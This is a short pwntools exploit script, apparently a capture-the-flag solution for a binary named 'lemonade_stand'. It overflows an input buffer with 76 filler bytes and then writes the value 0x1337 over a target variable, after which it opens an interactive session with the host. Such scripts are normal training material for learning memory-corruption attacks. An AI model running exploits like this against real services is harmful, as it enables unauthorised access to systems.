#!/usr/bin/env python3
from pwn import *

exe = ELF("./lemonade_stand")
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER
EXPECTED_VAL = 0x1337

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_TARGET = 76

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    # ── exploit phase ─────────────────────────────────────────────────────────
    payload = flat(
        b'A' * OFFSET_TO_TARGET,   # fill buffer up to target
        p32(EXPECTED_VAL),                # overwrite target with the required value
    )

    r.recvuntil(b"price:")
    r.sendline(payload)
    r.interactive()

if __name__ == '__main__':
    main()